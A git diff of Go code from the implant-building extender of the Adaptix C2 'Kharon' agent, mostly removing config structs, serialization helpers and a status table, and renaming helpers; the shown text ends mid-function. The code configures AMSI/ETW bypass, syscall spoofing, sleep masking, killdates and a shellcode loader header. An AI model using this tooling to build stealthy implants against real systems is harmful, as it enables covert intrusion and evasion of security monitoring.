@@ -13,9 +13,7 @@ import (
 	"sort"
 	"strconv"
 
-	// "unsafe"
 	"time"
-	"unicode/utf16"
 
 	"errors"
 	"fmt"
@@ -26,64 +24,6 @@ import (
 
 	ax "github.com/Adaptix-Framework/axc2"
 )
-
-type KharonConfig struct {
-	agentId string
-
-	osArch   byte
-	userName string
-	computer string
-	netbios  string
-	pid      int
-	tid      int
-	imgPath  string
-
-	acp   int
-	oemcp int
-
-	injectTech int
-	stompMod   string
-	allocation int
-	writing    int
-
-	syscall   int
-	bookProxy bool
-	amsietwbp int
-
-	killdateEbl   bool
-	killdateExit  bool
-	killdateSDel  bool
-	killdateYear  int16
-	killdateMonth int16
-	killdateDay   int16
-
-	cmdLine  string
-	heap     int
-	elevated bool
-	jitter   int
-	sleep    int
-	parentId int
-	psArch   int
-	memStart int64
-	memEnd   int64
-}
-
-func bytesToHexString(data []byte) string {
-	if len(data) == 0 {
-		return "{ }"
-	}
-
-	var result string
-	result = "{ "
-	for i, b := range data {
-		result += fmt.Sprintf("0x%02x", b)
-		if i < len(data)-1 {
-			result += ", "
-		}
-	}
-	result += " }"
-	return result
-}
 
 func AgentGenerateProfile(agentConfig string, listenerWM string, listenerMap map[string]any) ([]byte, error) {
 
@@ -117,204 +57,11 @@ func AgentGenerateProfile(agentConfig string, listenerWM string, listenerMap map
 	return nil, nil
 }
 
-type KharonData struct {
-	machine struct {
-		username  string
-		computer  string
-		domain    string
-		netbios   string
-		ipaddress string
-
-		os_arch byte
-
-		processor_numbers uint32
-		processor_name    string
-
-		ram_used  uint32
-		ram_total uint32
-		ram_aval  uint32
-		ram_perct uint32
-
-		os_minor uint32
-		os_major uint32
-		os_build uint32
-
-		allocation_gran uint32
-		page_size       uint32
-
-		cfg_enabled bool
-		dse_status  uint32
-		vbs_hvci    uint32
-	}
-
-	session struct {
-		agent_id_str string
-		agent_id_int uint32
-
-		sleep_time uint32
-		jitter     uint32
-
-		heap_handle uint64
-
-		elevated bool
-
-		process_arch uint32
-
-		img_path   string
-		img_name   string
-		cmd_line   string
-		process_id uint32
-		thread_id  uint32
-		parent_id  uint32
-
-		acp   uint32
-		oemcp uint32
-
-		base struct {
-			start string
-			end   string
-
-			size uint32
-		}
-	}
-
-	killdate struct {
-		enabled bool
-		exit    bool // true: exit process | false: exit thread
-		selfdel bool
-
-		date time.Time
-	}
-
-	worktime struct {
-		enabled bool
-		start   string
-		end     string
-	}
-
-	guardrails struct {
-		ipaddress string
-		hostname  string
-		username  string
-		domain    string
-	}
-
-	mask struct {
-		heap   bool
-		beacon uint32
-
-		jmpgadget  string
-		ntcontinue string
-	}
-
-	evasion struct {
-		bof_proxy       bool
-		syscall         uint32
-		amsi_etw_bypass int32
-	}
-
-	ps struct {
-		parent_id  uint32
-		block_dlls bool
-		spawnto    string
-		fork_pipe  string
-	}
-}
-
-type AgentConfig struct {
-	Format string `json:"format"`
-	Debug  bool   `json:"debug_mode"`
-	Sleep  string `json:"sleep"`
-	Jitter int    `json:"jitter"`
-
-	KilldateCheck bool   `json:"killdate_check"`
-	KilldateDate  string `json:"killdate_date"`
-
-	ForkPipe    string `json:"fork_pipename"`
-	Spawnto     string `json:"spawnto"`
-	Bypass      string `json:"bypass"`
-	MaskHeap    bool   `json:"mask_heap"`
-	MaskSleep   string `json:"mask_sleep"`
-	BofApiProxy bool   `json:"bof_api_proxy"`
-	Syscall     string `json:"syscall"`
-
-	GuardIpAddress  string `json:"guardrails_ip"`
-	GuardHostName   string `json:"guardrails_hostname"`
-	GuardUserName   string `json:"guardrails_user"`
-	GuardDomainName string `json:"guardrails_domain"`
-
-	WorkingTimeCheck bool   `json:"workingtime_check"`
-	WorkingTimeEnd   string `json:"workingtime_end"`
-	WorkingTimeStart string `json:"workingtime_start"`
-
-	kharon_data []byte
-}
-
-type OutputConfig struct {
-	Mask      bool
-	Header    string
-	Format    string
-	Parameter string
-	Body      string
-
-	Append  string
-	Prepend string
-}
-
-type URIConfig struct {
-	ServerOutput *OutputConfig
-	ClientOutput *OutputConfig
-	ClientParams []map[string]interface{}
-}
-
-type ServerError struct {
-	Status   int
-	Response string
-}
-
-type HTTPMethod struct {
-	ServerHeaders map[string]string
-	EmptyResponse []byte
-	ClientHeaders map[string]string
-	URI           map[string]URIConfig
-}
-
-type Callback struct {
-	Hosts       []string
-	Host        string
-	UserAgent   string
-	ServerError *ServerError
-	Get         *HTTPMethod
-	Post        *HTTPMethod
-}
-
-type ServerRequest struct {
-	Headers   string
-	Body      []byte
-	EmptyResp []byte
-	Payload   []byte
-}
-
-type ClientRequest struct {
-	Uri        string
-	HttpMethod string
-	Address    string
-	Params     map[string][]string
-	UserAgent  string
-	Body       []byte
-	Payload    []byte
-
-	Config Callback
-
-	UriConfig     *URIConfig
-	HttpMethodCfg *HTTPMethod
-}
-
 func AgentGenerateBuild(agentConfig string, agentProfile []byte, listenerMap map[string]any) ([]byte, string, error) {
 	fmt.Println("=== AgentGenerateBuild START ===")
 	fmt.Printf("DEBUG: agentConfig length: %d bytes\n", len(agentConfig))
 	fmt.Printf("DEBUG: agentProfile length: %d bytes\n", len(agentProfile))
-	fmt.Printf("DEBUG: listenerMap keys: %v\n", getMapKeys(listenerMap))
+	fmt.Printf("DEBUG: listenerMap keys: %v\n", get_map_keys(listenerMap))
 
 	var cfg AgentConfig
 	if err := json.Unmarshal([]byte(agentConfig), &cfg); err != nil {
@@ -496,8 +243,8 @@ func AgentGenerateBuild(agentConfig string, agentProfile []byte, listenerMap map
 
 	// Build make variables
 	makeVars := []string{
-		fmt.Sprintf("WEB_SECURE_ENABLED=%d", boolToInt(sslEnabled)),
-		fmt.Sprintf("WEB_PROXY_ENABLED=%d", boolToInt(proxyEnabled)),
+		fmt.Sprintf("WEB_SECURE_ENABLED=%d", bool_to_int(sslEnabled)),
+		fmt.Sprintf("WEB_PROXY_ENABLED=%d", bool_to_int(proxyEnabled)),
 		fmt.Sprintf("WEB_PROXY_URL=%s", proxyURL),
 		fmt.Sprintf("WEB_PROXY_USERNAME=%s", proxyUser),
 		fmt.Sprintf("WEB_PROXY_PASSWORD=%s", proxyPass),
@@ -506,13 +253,13 @@ func AgentGenerateBuild(agentConfig string, agentProfile []byte, listenerMap map
 		fmt.Sprintf("KH_JITTER=%d", cfg.Jitter),
 		fmt.Sprintf("KH_AGENT_UUID=%s", uuid.New()),
 
-		fmt.Sprintf("KH_WORKTIME_ENABLED=%d", boolToInt(cfg.WorkingTimeCheck)),
+		fmt.Sprintf("KH_WORKTIME_ENABLED=%d", bool_to_int(cfg.WorkingTimeCheck)),
 		fmt.Sprintf("KH_WORKTIME_START_HOUR=%d", workStartHour),
 		fmt.Sprintf("KH_WORKTIME_START_MIN=%d", workStartMin),
 		fmt.Sprintf("KH_WORKTIME_END_HOUR=%d", workEndHour),
 		fmt.Sprintf("KH_WORKTIME_END_MIN=%d", workEndMin),
 
-		fmt.Sprintf("KH_KILLDATE_ENABLED=%d", boolToInt(cfg.KilldateCheck)),
+		fmt.Sprintf("KH_KILLDATE_ENABLED=%d", bool_to_int(cfg.KilldateCheck)),
 		fmt.Sprintf("KH_KILLDATE_DAY=%d", killdateDay),
 		fmt.Sprintf("KH_KILLDATE_MONTH=%d", killdateMonth),
 		fmt.Sprintf("KH_KILLDATE_YEAR=%d", killdateYear),
@@ -520,10 +267,10 @@ func AgentGenerateBuild(agentConfig string, agentProfile []byte, listenerMap map
 		fmt.Sprintf("KH_FORK_PIPENAME=%s", forkPipeC),
 		fmt.Sprintf("KH_SPAWNTO_X64=%s", spawnto),
 
-		fmt.Sprintf("KH_BOF_HOOK_ENABLED=%d", boolToInt(cfg.BofApiProxy)),
+		fmt.Sprintf("KH_BOF_HOOK_ENABLED=%d", bool_to_int(cfg.BofApiProxy)),
 
 		// Malleable HTTP bytes como array C entre aspas
-		fmt.Sprintf("HTTP_MALLEABLE_BYTES=\"%s\"", bytesToHexString(malleableBytes)),
+		fmt.Sprintf("HTTP_MALLEABLE_BYTES=\"%s\"", bytes_to_hexstr(malleableBytes)),
 		fmt.Sprintf("HTTP_CALLBACK_COUNT=%d", callbackCount),
 	}
 
@@ -656,7 +403,7 @@ func AgentGenerateBuild(agentConfig string, agentProfile []byte, listenerMap map
 		shellcodeHeaderPath := filepath.Join(loaderPath, "Include", "Shellcode.h")
 		fmt.Printf("DEBUG: Generating shellcode header at: %s\n", shellcodeHeaderPath)
 
-		shellcodeContent := generateShellcodeHeader(bin)
+		shellcodeContent := gen_shelllcode_header(bin)
 		fmt.Printf("DEBUG: Generated shellcode header (%d bytes)\n", len(shellcodeContent))
 
 		if err := os.WriteFile(shellcodeHeaderPath, []byte(shellcodeContent), 0644); err != nil {
@@ -767,542 +514,6 @@ func AgentGenerateBuild(agentConfig string, agentProfile []byte, listenerMap map
 	fmt.Println("=== AgentGenerateBuild END ===\n")
 
 	return finalBin, outFileName, nil
-}
-
-func writeString(buf *bytes.Buffer, s string) error {
-	data := []byte(s)
-	if err := binary.Write(buf, binary.LittleEndian, uint32(len(data))); err != nil {
-		return err
-	}
-	if err := binary.Write(buf, binary.LittleEndian, data); err != nil {
-		return err
-	}
-	return nil
-}
-
-func readString(buf *bytes.Reader) (string, error) {
-	var len uint32
-	if err := binary.Read(buf, binary.LittleEndian, &len); err != nil {
-		return "", err
-	}
-	data := make([]byte, len)
-	if err := binary.Read(buf, binary.LittleEndian, &data); err != nil {
-		return "", err
-	}
-	return string(data), nil
-}
-
-func writeBool(buf *bytes.Buffer, b bool) error {
-	val := uint8(0)
-	if b {
-		val = 1
-	}
-	return binary.Write(buf, binary.LittleEndian, val)
-}
-
-func readBool(buf *bytes.Reader) (bool, error) {
-	var val uint8
-	err := binary.Read(buf, binary.LittleEndian, &val)
-	return val != 0, err
-}
-
-func writeTime(buf *bytes.Buffer, t time.Time) error {
-	return binary.Write(buf, binary.LittleEndian, t.Unix())
-}
-
-func readTime(buf *bytes.Reader) (time.Time, error) {
-	var timestamp int64
-	err := binary.Read(buf, binary.LittleEndian, &timestamp)
-	return time.Unix(timestamp, 0).UTC(), err
-}
-
-func (k *KharonData) Marshal() ([]byte, error) {
-	var buf bytes.Buffer
-
-	// Machine
-	if err := writeString(&buf, k.machine.username); err != nil {
-		return nil, err
-	}
-	if err := writeString(&buf, k.machine.computer); err != nil {
-		return nil, err
-	}
-	if err := writeString(&buf, k.machine.domain); err != nil {
-		return nil, err
-	}
-	if err := writeString(&buf, k.machine.netbios); err != nil {
-		return nil, err
-	}
-	if err := writeString(&buf, k.machine.ipaddress); err != nil {
-		return nil, err
-	}
-	if err := binary.Write(&buf, binary.LittleEndian, k.machine.os_arch); err != nil {
-		return nil, err
-	}
-	if err := binary.Write(&buf, binary.LittleEndian, k.machine.processor_numbers); err != nil {
-		return nil, err
-	}
-	if err := writeString(&buf, k.machine.processor_name); err != nil {
-		return nil, err
-	}
-	if err := binary.Write(&buf, binary.LittleEndian, k.machine.ram_used); err != nil {
-		return nil, err
-	}
-	if err := binary.Write(&buf, binary.LittleEndian, k.machine.ram_total); err != nil {
-		return nil, err
-	}
-	if err := binary.Write(&buf, binary.LittleEndian, k.machine.ram_aval); err != nil {
-		return nil, err
-	}
-	if err := binary.Write(&buf, binary.LittleEndian, k.machine.ram_perct); err != nil {
-		return nil, err
-	}
-	if err := binary.Write(&buf, binary.LittleEndian, k.machine.os_minor); err != nil {
-		return nil, err
-	}
-	if err := binary.Write(&buf, binary.LittleEndian, k.machine.os_major); err != nil {
-		return nil, err
-	}
-	if err := binary.Write(&buf, binary.LittleEndian, k.machine.os_build); err != nil {
-		return nil, err
-	}
-	if err := binary.Write(&buf, binary.LittleEndian, k.machine.allocation_gran); err != nil {
-		return nil, err
-	}
-	if err := binary.Write(&buf, binary.LittleEndian, k.machine.page_size); err != nil {
-		return nil, err
-	}
-	if err := writeBool(&buf, k.machine.cfg_enabled); err != nil {
-		return nil, err
-	}
-	if err := binary.Write(&buf, binary.LittleEndian, k.machine.dse_status); err != nil {
-		return nil, err
-	}
-	if err := binary.Write(&buf, binary.LittleEndian, k.machine.vbs_hvci); err != nil {
-		return nil, err
-	}
-
-	// Session
-	if err := writeString(&buf, k.session.agent_id_str); err != nil {
-		return nil, err
-	}
-	if err := binary.Write(&buf, binary.LittleEndian, k.session.agent_id_int); err != nil {
-		return nil, err
-	}
-	if err := binary.Write(&buf, binary.LittleEndian, k.session.sleep_time); err != nil {
-		return nil, err
-	}
-	if err := binary.Write(&buf, binary.LittleEndian, k.session.jitter); err != nil {
-		return nil, err
-	}
-	if err := binary.Write(&buf, binary.LittleEndian, k.session.heap_handle); err != nil {
-		return nil, err
-	}
-	if err := writeBool(&buf, k.session.elevated); err != nil {
-		return nil, err
-	}
-	if err := binary.Write(&buf, binary.LittleEndian, k.session.process_arch); err != nil {
-		return nil, err
-	}
-	if err := writeString(&buf, k.session.img_path); err != nil {
-		return nil, err
-	}
-	if err := writeString(&buf, k.session.img_name); err != nil {
-		return nil, err
-	}
-	if err := writeString(&buf, k.session.cmd_line); err != nil {
-		return nil, err
-	}
-	if err := binary.Write(&buf, binary.LittleEndian, k.session.process_id); err != nil {
-		return nil, err
-	}
-	if err := binary.Write(&buf, binary.LittleEndian, k.session.thread_id); err != nil {
-		return nil, err
-	}
-	if err := binary.Write(&buf, binary.LittleEndian, k.session.parent_id); err != nil {
-		return nil, err
-	}
-	if err := binary.Write(&buf, binary.LittleEndian, k.session.acp); err != nil {
-		return nil, err
-	}
-	if err := binary.Write(&buf, binary.LittleEndian, k.session.oemcp); err != nil {
-		return nil, err
-	}
-	if err := writeString(&buf, k.session.base.start); err != nil {
-		return nil, err
-	}
-	if err := writeString(&buf, k.session.base.end); err != nil {
-		return nil, err
-	}
-	if err := binary.Write(&buf, binary.LittleEndian, k.session.base.size); err != nil {
-		return nil, err
-	}
-
-	// Killdate
-	if err := writeBool(&buf, k.killdate.enabled); err != nil {
-		return nil, err
-	}
-	if err := writeBool(&buf, k.killdate.exit); err != nil {
-		return nil, err
-	}
-	if err := writeBool(&buf, k.killdate.selfdel); err != nil {
-		return nil, err
-	}
-	if err := writeTime(&buf, k.killdate.date); err != nil {
-		return nil, err
-	}
-
-	// Worktime
-	if err := writeBool(&buf, k.worktime.enabled); err != nil {
-		return nil, err
-	}
-	if err := writeString(&buf, k.worktime.start); err != nil {
-		return nil, err
-	}
-	if err := writeString(&buf, k.worktime.end); err != nil {
-		return nil, err
-	}
-
-	// Guardrails
-	if err := writeString(&buf, k.guardrails.ipaddress); err != nil {
-		return nil, err
-	}
-	if err := writeString(&buf, k.guardrails.hostname); err != nil {
-		return nil, err
-	}
-	if err := writeString(&buf, k.guardrails.username); err != nil {
-		return nil, err
-	}
-	if err := writeString(&buf, k.guardrails.domain); err != nil {
-		return nil, err
-	}
-
-	// Mask
-	if err := writeBool(&buf, k.mask.heap); err != nil {
-		return nil, err
-	}
-	if err := binary.Write(&buf, binary.LittleEndian, k.mask.beacon); err != nil {
-		return nil, err
-	}
-	if err := writeString(&buf, k.mask.jmpgadget); err != nil {
-		return nil, err
-	}
-	if err := writeString(&buf, k.mask.ntcontinue); err != nil {
-		return nil, err
-	}
-
-	// Evasion
-	if err := writeBool(&buf, k.evasion.bof_proxy); err != nil {
-		return nil, err
-	}
-	if err := binary.Write(&buf, binary.LittleEndian, k.evasion.syscall); err != nil {
-		return nil, err
-	}
-	if err := binary.Write(&buf, binary.LittleEndian, k.evasion.amsi_etw_bypass); err != nil {
-		return nil, err
-	}
-
-	// PS
-	if err := binary.Write(&buf, binary.LittleEndian, k.ps.parent_id); err != nil {
-		return nil, err
-	}
-	if err := writeBool(&buf, k.ps.block_dlls); err != nil {
-		return nil, err
-	}
-	if err := writeString(&buf, k.ps.spawnto); err != nil {
-		return nil, err
-	}
-	if err := writeString(&buf, k.ps.fork_pipe); err != nil {
-		return nil, err
-	}
-
-	return buf.Bytes(), nil
-}
-
-func (k *KharonData) Unmarshal(data []byte) error {
-	buf := bytes.NewReader(data)
-
-	// Machine
-	var err error
-	k.machine.username, err = readString(buf)
-	if err != nil {
-		return fmt.Errorf("failed to read machine.username: %w", err)
-	}
-
-	k.machine.computer, err = readString(buf)
-	if err != nil {
-		return fmt.Errorf("failed to read machine.computer: %w", err)
-	}
-
-	k.machine.domain, err = readString(buf)
-	if err != nil {
-		return fmt.Errorf("failed to read machine.domain: %w", err)
-	}
-
-	k.machine.netbios, err = readString(buf)
-	if err != nil {
-		return fmt.Errorf("failed to read machine.netbios: %w", err)
-	}
-
-	k.machine.ipaddress, err = readString(buf)
-	if err != nil {
-		return fmt.Errorf("failed to read machine.ipaddress: %w", err)
-	}
-
-	if err := binary.Read(buf, binary.LittleEndian, &k.machine.os_arch); err != nil {
-		return fmt.Errorf("failed to read machine.os_arch: %w", err)
-	}
-
-	if err := binary.Read(buf, binary.LittleEndian, &k.machine.processor_numbers); err != nil {
-		return fmt.Errorf("failed to read machine.processor_numbers: %w", err)
-	}
-
-	k.machine.processor_name, err = readString(buf)
-	if err != nil {
-		return fmt.Errorf("failed to read machine.processor_name: %w", err)
-	}
-
-	if err := binary.Read(buf, binary.LittleEndian, &k.machine.ram_used); err != nil {
-		return fmt.Errorf("failed to read machine.ram_used: %w", err)
-	}
-
-	if err := binary.Read(buf, binary.LittleEndian, &k.machine.ram_total); err != nil {
-		return fmt.Errorf("failed to read machine.ram_total: %w", err)
-	}
-
-	if err := binary.Read(buf, binary.LittleEndian, &k.machine.ram_aval); err != nil {
-		return fmt.Errorf("failed to read machine.ram_aval: %w", err)
-	}
-
-	if err := binary.Read(buf, binary.LittleEndian, &k.machine.ram_perct); err != nil {
-		return fmt.Errorf("failed to read machine.ram_perct: %w", err)
-	}
-
-	if err := binary.Read(buf, binary.LittleEndian, &k.machine.os_minor); err != nil {
-		return fmt.Errorf("failed to read machine.os_minor: %w", err)
-	}
-
-	if err := binary.Read(buf, binary.LittleEndian, &k.machine.os_major); err != nil {
-		return fmt.Errorf("failed to read machine.os_major: %w", err)
-	}
-
-	if err := binary.Read(buf, binary.LittleEndian, &k.machine.os_build); err != nil {
-		return fmt.Errorf("failed to read machine.os_build: %w", err)
-	}
-
-	if err := binary.Read(buf, binary.LittleEndian, &k.machine.allocation_gran); err != nil {
-		return fmt.Errorf("failed to read machine.allocation_gran: %w", err)
-	}
-
-	if err := binary.Read(buf, binary.LittleEndian, &k.machine.page_size); err != nil {
-		return fmt.Errorf("failed to read machine.page_size: %w", err)
-	}
-
-	k.machine.cfg_enabled, err = readBool(buf)
-	if err != nil {
-		return fmt.Errorf("failed to read machine.cfg_enabled: %w", err)
-	}
-
-	if err := binary.Read(buf, binary.LittleEndian, &k.machine.dse_status); err != nil {
-		return fmt.Errorf("failed to read machine.dse_status: %w", err)
-	}
-
-	if err := binary.Read(buf, binary.LittleEndian, &k.machine.vbs_hvci); err != nil {
-		return fmt.Errorf("failed to read machine.vbs_hvci: %w", err)
-	}
-
-	// Session
-	k.session.agent_id_str, err = readString(buf)
-	if err != nil {
-		return fmt.Errorf("failed to read session.agent_id_str: %w", err)
-	}
-
-	if err := binary.Read(buf, binary.LittleEndian, &k.session.agent_id_int); err != nil {
-		return fmt.Errorf("failed to read session.agent_id_int: %w", err)
-	}
-
-	if err := binary.Read(buf, binary.LittleEndian, &k.session.sleep_time); err != nil {
-		return fmt.Errorf("failed to read session.sleep_time: %w", err)
-	}
-
-	if err := binary.Read(buf, binary.LittleEndian, &k.session.jitter); err != nil {
-		return fmt.Errorf("failed to read session.jitter: %w", err)
-	}
-
-	if err := binary.Read(buf, binary.LittleEndian, &k.session.heap_handle); err != nil {
-		return fmt.Errorf("failed to read session.heap_handle: %w", err)
-	}
-
-	k.session.elevated, err = readBool(buf)
-	if err != nil {
-		return fmt.Errorf("failed to read session.elevated: %w", err)
-	}
-
-	if err := binary.Read(buf, binary.LittleEndian, &k.session.process_arch); err != nil {
-		return fmt.Errorf("failed to read session.process_arch: %w", err)
-	}
-
-	k.session.img_path, err = readString(buf)
-	if err != nil {
-		return fmt.Errorf("failed to read session.img_path: %w", err)
-	}
-
-	k.session.img_name, err = readString(buf)
-	if err != nil {
-		return fmt.Errorf("failed to read session.img_name: %w", err)
-	}
-
-	k.session.cmd_line, err = readString(buf)
-	if err != nil {
-		return fmt.Errorf("failed to read session.cmd_line: %w", err)
-	}
-
-	if err := binary.Read(buf, binary.LittleEndian, &k.session.process_id); err != nil {
-		return fmt.Errorf("failed to read session.process_id: %w", err)
-	}
-
-	if err := binary.Read(buf, binary.LittleEndian, &k.session.thread_id); err != nil {
-		return fmt.Errorf("failed to read session.thread_id: %w", err)
-	}
-
-	if err := binary.Read(buf, binary.LittleEndian, &k.session.parent_id); err != nil {
-		return fmt.Errorf("failed to read session.parent_id: %w", err)
-	}
-
-	if err := binary.Read(buf, binary.LittleEndian, &k.session.acp); err != nil {
-		return fmt.Errorf("failed to read session.acp: %w", err)
-	}
-
-	if err := binary.Read(buf, binary.LittleEndian, &k.session.oemcp); err != nil {
-		return fmt.Errorf("failed to read session.oemcp: %w", err)
-	}
-
-	k.session.base.start, err = readString(buf)
-	if err != nil {
-		return fmt.Errorf("failed to read session.base.start: %w", err)
-	}
-
-	k.session.base.end, err = readString(buf)
-	if err != nil {
-		return fmt.Errorf("failed to read session.base.end: %w", err)
-	}
-
-	if err := binary.Read(buf, binary.LittleEndian, &k.session.base.size); err != nil {
-		return fmt.Errorf("failed to read session.base.size: %w", err)
-	}
-
-	// Killdate
-	k.killdate.enabled, err = readBool(buf)
-	if err != nil {
-		return fmt.Errorf("failed to read killdate.enabled: %w", err)
-	}
-
-	k.killdate.exit, err = readBool(buf)
-	if err != nil {
-		return fmt.Errorf("failed to read killdate.exit: %w", err)
-	}
-
-	k.killdate.selfdel, err = readBool(buf)
-	if err != nil {
-		return fmt.Errorf("failed to read killdate.selfdel: %w", err)
-	}
-
-	k.killdate.date, err = readTime(buf)
-	if err != nil {
-		return fmt.Errorf("failed to read killdate.date: %w", err)
-	}
-
-	// Worktime
-	k.worktime.enabled, err = readBool(buf)
-	if err != nil {
-		return fmt.Errorf("failed to read worktime.enabled: %w", err)
-	}
-
-	k.worktime.start, err = readString(buf)
-	if err != nil {
-		return fmt.Errorf("failed to read worktime.start: %w", err)
-	}
-
-	k.worktime.end, err = readString(buf)
-	if err != nil {
-		return fmt.Errorf("failed to read worktime.end: %w", err)
-	}
-
-	// Guardrails
-	k.guardrails.ipaddress, err = readString(buf)
-	if err != nil {
-		return fmt.Errorf("failed to read guardrails.ipaddress: %w", err)
-	}
-
-	k.guardrails.hostname, err = readString(buf)
-	if err != nil {
-		return fmt.Errorf("failed to read guardrails.hostname: %w", err)
-	}
-
-	k.guardrails.username, err = readString(buf)
-	if err != nil {
-		return fmt.Errorf("failed to read guardrails.username: %w", err)
-	}
-
-	k.guardrails.domain, err = readString(buf)
-	if err != nil {
-		return fmt.Errorf("failed to read guardrails.domain: %w", err)
-	}
-
-	// Mask
-	k.mask.heap, err = readBool(buf)
-	if err != nil {
-		return fmt.Errorf("failed to read mask.heap: %w", err)
-	}
-
-	if err := binary.Read(buf, binary.LittleEndian, &k.mask.beacon); err != nil {
-		return fmt.Errorf("failed to read mask.beacon: %w", err)
-	}
-
-	k.mask.jmpgadget, err = readString(buf)
-	if err != nil {
-		return fmt.Errorf("failed to read mask.jmpgadget: %w", err)
-	}
-
-	k.mask.ntcontinue, err = readString(buf)
-	if err != nil {
-		return fmt.Errorf("failed to read mask.ntcontinue: %w", err)
-	}
-
-	// Evasion
-	k.evasion.bof_proxy, err = readBool(buf)
-	if err != nil {
-		return fmt.Errorf("failed to read evasion.bof_proxy: %w", err)
-	}
-
-	if err := binary.Read(buf, binary.LittleEndian, &k.evasion.syscall); err != nil {
-		return fmt.Errorf("failed to read evasion.syscall: %w", err)
-	}
-
-	if err := binary.Read(buf, binary.LittleEndian, &k.evasion.amsi_etw_bypass); err != nil {
-		return fmt.Errorf("failed to read evasion.amsi_etw_bypass: %w", err)
-	}
-
-	// PS
-	if err := binary.Read(buf, binary.LittleEndian, &k.ps.parent_id); err != nil {
-		return fmt.Errorf("failed to read ps.parent_id: %w", err)
-	}
-
-	k.ps.block_dlls, err = readBool(buf)
-	if err != nil {
-		return fmt.Errorf("failed to read ps.block_dlls: %w", err)
-	}
-
-	k.ps.spawnto, err = readString(buf)
-	if err != nil {
-		return fmt.Errorf("failed to read ps.spawnto: %w", err)
-	}
-
-	k.ps.fork_pipe, err = readString(buf)
-	if err != nil {
-		return fmt.Errorf("failed to read ps.fork_pipe: %w", err)
-	}
-
-	return nil
 }
 
 func GetWindowsVersionName(major uint32, minor uint32, build uint32) string {
@@ -1532,7 +743,7 @@ func CreateAgent(initialData []byte) (ax.AgentData, ax.ExtenderAgent, error) {
 	khcfg.machine.processor_name = string(packer.ParseBytes())
 	fmt.Printf("Processor Name: %v\n", khcfg.machine.processor_name)
 
-	khcfg.machine.ipaddress = int32ToIPv4(packer.ParseInt32())
+	khcfg.machine.ipaddress = int32_to_ipv4(packer.ParseInt32())
 	fmt.Printf("ipaddress: %s\n", khcfg.machine.ipaddress)
 
 	khcfg.machine.ram_total = uint32(packer.ParseInt32())
@@ -1664,235 +875,6 @@ func PackPivotTasks(pivotId string, data []byte) ([]byte, error) {
 
 	return data, nil
 }
-
-func FormatKharonTable(data *KharonData) string {
-	var b strings.Builder
-
-	// Configurações de coluna
-	colLabel := 25
-	colValue := 50
-
-	// ==================== HELPER FUNCTIONS ====================
-	boolStr := func(val bool) string {
-		if val {
-			return "True"
-		}
-		return "False"
-	}
-
-	// boolStrUint32 := func(val uint32) string {
-	// 	if val != 0 {
-	// 		return "True"
-	// 	}
-	// 	return "False"
-	// }
-
-	maskTechStr := func(id uint32) string {
-		switch id {
-		case 1:
-			return "Timer"
-		case 2:
-			return "Pooling"
-		case 3:
-			return "None"
-		default:
-			return fmt.Sprintf("%d", id)
-		}
-	}
-
-	syscallStr := func(sys uint32) string {
-		switch sys {
-		case 0:
-			return "None"
-		case 1:
-			return "Spoof"
-		case 2:
-			return "Spoof + Indirect"
-		default:
-			return fmt.Sprintf("%d", sys)
-		}
-	}
-
-	amsietwbpStr := func(id int32) string {
-		switch id {
-		case 0x100:
-			return "All"
-		case 0x700:
-			return "AMSI"
-		case 0x400:
-			return "ETW"
-		case 0x000:
-			return "None"
-		default:
-			return fmt.Sprintf("0x%03X", id)
-		}
-	}
-
-	dseStatusStr := func(status uint32) string {
-		switch status {
-		case 0:
-			return "Disabled"
-		case 1:
-			return "Enabled"
-		default:
-			return fmt.Sprintf("%d", status)
-		}
-	}
-
-	vbsHvciStr := func(status uint32) string {
-		switch status {
-		case 0:
-			return "Disabled"
-		case 1:
-			return "Enabled"
-		default:
-			return fmt.Sprintf("%d", status)
-		}
-	}
-
-	// ==================== FORMATTING FUNCTIONS ====================
-	row := func(label, value string) string {
-		return fmt.Sprintf("│ %-*s │ %-*s │\n", colLabel, label, colValue, value)
-	}
-
-	border := func(title string) string {
-		borderLine := "├" + strings.Repeat("─", colLabel+2) + "┼" + strings.Repeat("─", colValue+2) + "┤"
-		if title == "top" {
-			return "┌" + strings.Repeat("─", colLabel+2) + "┬" + strings.Repeat("─", colValue+2) + "┐\n"
-		} else if title == "bottom" {
-			return "└" + strings.Repeat("─", colLabel+2) + "┴" + strings.Repeat("─", colValue+2) + "┘\n"
-		}
-		return borderLine + "\n"
-	}
-
-	sectionTitle := func(title string) string {
-		padding := (colLabel + colValue + 6 - len(title)) / 2
-		return fmt.Sprintf("│ %s%s%s │\n",
-			strings.Repeat(" ", padding),
-			title,
-			strings.Repeat(" ", padding))
-	}
-
-	// Top border
-	b.WriteString(border("top"))
-
-	// ==================== SESSION ====================
-	b.WriteString(sectionTitle("SESSION INFORMATION"))
-	b.WriteString(border("middle"))
-	b.WriteString(row("Agent ID", data.session.agent_id_str[:min(8, len(data.session.agent_id_str))]))
-	b.WriteString(row("Image Name", data.session.img_name))
-	b.WriteString(row("Image Path", data.session.img_path))
-	b.WriteString(row("Command Line", data.session.cmd_line))
-	b.WriteString(row("Process ID", fmt.Sprintf("%d", data.session.process_id)))
-	b.WriteString(row("Thread ID", fmt.Sprintf("%d", data.session.thread_id)))
-	b.WriteString(row("Parent ID", fmt.Sprintf("%d", data.session.parent_id)))
-	b.WriteString(row("Elevated", boolStr(data.session.elevated)))
-	b.WriteString(row("Process Arch", fmt.Sprintf("0x%02X", data.session.process_arch)))
-	b.WriteString(row("Heap Handle", fmt.Sprintf("0x%016X", data.session.heap_handle)))
-	b.WriteString(row("Kharon in-memory base", data.session.base.start))
-	b.WriteString(row("Kharon in-memory Size", fmt.Sprintf("%d bytes", data.session.base.size)))
-	b.WriteString(row("Code Page (ACP)", fmt.Sprintf("%d", data.session.acp)))
-	b.WriteString(row("OEM Code Page", fmt.Sprintf("%d", data.session.oemcp)))
-	b.WriteString(border("middle"))
-
-	// ==================== TIMING ====================
-	b.WriteString(sectionTitle("TIMING CONFIGURATION"))
-	b.WriteString(border("middle"))
-	b.WriteString(row("Sleep Time", fmt.Sprintf("%d ms", data.session.sleep_time)))
-	b.WriteString(row("Jitter", fmt.Sprintf("%d%%", data.session.jitter)))
-	b.WriteString(border("middle"))
-
-	// ==================== EVASION ====================
-	b.WriteString(sectionTitle("EVASION TECHNIQUES"))
-	b.WriteString(border("middle"))
-	b.WriteString(row("Mask Beacon", maskTechStr(data.mask.beacon)))
-	b.WriteString(row("Heap Mask", boolStr(data.mask.heap)))
-	b.WriteString(row("Jump Gadget", data.mask.jmpgadget))
-	b.WriteString(row("NtContinue Gadget", data.mask.ntcontinue))
-	b.WriteString(row("BOF API Proxy", boolStr(data.evasion.bof_proxy)))
